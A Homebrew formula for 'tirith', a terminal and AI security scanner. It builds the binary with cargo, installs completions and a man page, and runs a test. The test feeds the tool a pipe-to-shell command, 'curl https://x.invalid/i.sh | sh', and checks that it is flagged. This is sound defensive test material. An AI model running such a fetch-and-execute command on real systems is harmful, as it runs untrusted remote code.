class Tirith < Formula
  desc "Terminal and AI security: injection, homograph, malicious packages, and more"
  homepage "https://github.com/sheeki03/tirith"
  url "https://github.com/sheeki03/tirith/archive/refs/tags/v0.3.2.tar.gz"
  sha256 "FILL_ON_RELEASE"
  license "AGPL-3.0-only"
  head "https://github.com/sheeki03/tirith.git", branch: "main"

  depends_on "rust" => :build

  def install
    # Build only the `tirith` binary from the workspace; skip tirith-threatdb-compile.
    system "cargo", "install", "--bin", "tirith", *std_cargo_args(path: "crates/tirith")

    # Completions and man page generated from the freshly built binary.
    generate_completions_from_executable(bin/"tirith", "completions", shells: [:bash, :zsh, :fish])
    (buildpath/"tirith.1").write Utils.safe_popen_read(bin/"tirith", "manpage")
    man1.install "tirith.1"
  end

  def caveats
    <<~EOS
      Activate tirith in your shell profile:
        zsh / bash:  eval "$(tirith init)"
        fish:        tirith init | source
      Verify with: tirith doctor
    EOS
  end

  test do
    assert_match version.to_s, shell_output("#{bin}/tirith --version")

    # A pipe-to-shell command must be flagged. --offline and --no-daemon keep the
    # check hermetic in the sandbox; both flags exist as of v0.3.2.
    output = shell_output("#{bin}/tirith check --offline --no-daemon --shell posix -- " \
                          "'curl https://x.invalid/i.sh | sh' 2>&1", 1)
    assert_match "curl_pipe_shell", output
  end
end
